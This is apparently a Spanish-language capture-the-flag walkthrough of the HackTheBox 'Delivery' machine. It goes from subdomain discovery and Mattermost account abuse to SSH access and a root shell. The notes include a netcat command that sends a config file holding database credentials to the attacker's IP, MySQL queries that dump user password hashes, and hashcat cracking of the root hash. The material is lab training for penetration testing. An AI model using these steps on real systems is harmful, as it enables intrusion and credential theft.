## Summary

Tags: 
Y
- IP -> 10.10.10.222
- Ports -> TCP (22, 80, 8065), UDP (idk)
- OS ->  Linux Debian Buster
- Services & Applications
    -  22 ->  OpenSSH 7.9p1 Debian
    -  80 ->  http nginx 1.14.2
    -  8065 -> http webpage Mattermost


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
Miramos la pagina web para ver que podemos encontrar
- **/etc/hosts** -> delivery.htb 10.10.10.222
Ctrl + u en la pagina web y miramos el codigo fuente
- **/etc/hosts** -> helpdesk.delivery.htb 10.10.10.222 Agregamos el subdominio

- Comando -> **gobuster vhost -u http://delivery.htb -t 200 -w /usr/share/Seclists/Discovery/DNS/subdomains-top1million-5000.txt** Para descubrir mas subdominios en la ruta de la pagian web y encontramos helpdesk.delivery.htb
El cual nos pones a ingresar datos en las opciones y asi vamos descubriendo cosas. 
Lo interesante es que el correo que creamos en la pagina user@delivery.htb lo podemos usar para checar la consulta con el numero que nos dan y asi poder entrar a la pagina. 

Buscamos en Google que es (Mattermost) y es un servicio de chat en linea de codigo abierto y autohospedable con intercambio de archivos, busqueda e integraciones. 

En la pagina de mattermost podemos usar el correo temporal de la pagina helpdesk 4444@delivery.htb para poder usarlo y crearnos una cuenta en mattermost y cuando nos llegue el correo de verificacion poderlo ver en la pagina del helpdesk. Una vez verificada la cuenta ya podriamos ingresar a Mattermost. 
Una vez dentro de la pagina nos dan un usuario y password qur lo usaremos para conectarnos por ssh.

## User
- Comando -> **sshpass -p <'PASSWORD'> ssh < USER>@< IP>** Conectarnos por ssh y podemos mirar la flag de user.txt

-
Tratamiento de la consola Linux cuando entras a una maquina victima
 **Script /dev/null -c bash** Nos sales que esto no se puede hacer, por lo que hacemos lo siguiente
 **python3 -c ‘import pty;pty.spawn(“/bin/bash”)’** Para remplazar lo de arriba por si no nos deja
 **Ctrl + z**
 **stty raw -echo; fg**
 **reset xterm**

Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
**echo $SHELL** Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
**export SHELL=bash** Hacemos que shell ahora valga bash
**export TERM=xterm**

Ahora para modificar las dimensiones de nano debemos hacer lo siguiente.
**stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano

-
- Comando -> **lsb_release -a** Nos proporciona informacion de que Linux es 

- Comando -> **find / -name mattermost 2>/dev/null** Para encontrar el directorio y los permiso denegados no nos los muestre
- Comando -> **ps -faux | grep -i mattermost** Buscaremos la palabra mattermost de forma insensitive a nivel de procesos y encontramos una ruta la cual es **/opt/mattermost/bin/mattermost** en la cual solo usaremos esta parte **/opt/mattermost** e ingresamos a ese dir
Miramos lo que hay ahi adentro y encontramos un dir **config** en el cual miramos un config.json 

- Comando -> **nc -nlvp 443 | jq** Lo que recibamos por netcat lo convertimos en json para verlo mejor 
- Comando -> **cat config.json | nc 10.10.14.17 443** Enviamos el archivo encontrado a nuestra maquina de atacante para verlo mejor
Encontramos un usuario y una pasword las cuales usaremos para podernos conectar a la base de datos 

Nos conectamos a la base de datos de esta manera 
- Comando -> **mysql -u < user> -p** Nos conectamos y le proporcionamos la password encontrada en el archivo anterior
- **>show databases;**
- **>use mattermost;**
- **>show tables;** 
- **>describe Users;**
- **>select Username,Password from Users;**  Ahi encontraremos el usuario root y un hash 

Usamos la grafica de windows para hacer variantes de la password **PleaseSubscribe!** que es una palabra que encontramos en una conversacion en la pagina web de la maquina victima, en el cual estaremos usando en Windows **\\hashcat-6.2.6\\rules**. Ahi usaremos el **best64.rule** el cual nos ayudara a tener variantes de esa palabra

- Comando -> **hashcat.exe --stdout -r rules/best64.rule pwd.txt > passwords**  Podemos hacer y mostrar variantes de la password almacenada en ese archivo pwd.txt que contiene la palabra PleaseSubscribe! y despues de hacer las variantes nos podemos crear un diccionario llamado passwords, el cual podemos usar para crackear el hash.
- Comando -> **hashcat.exe -m 3200 -a 0 hash passwords** Con la misma herramienta crackearemos el hash pasandole el hash encontrado en la base de datos y el diccionario que acabamos de crear y nos da la password de root.

## Root

- Comando -> **su root** 
Colocamos la password que acabamos de descubrir e ingresamos como el usuario root. Ahora solo queda buscar la flag root.txt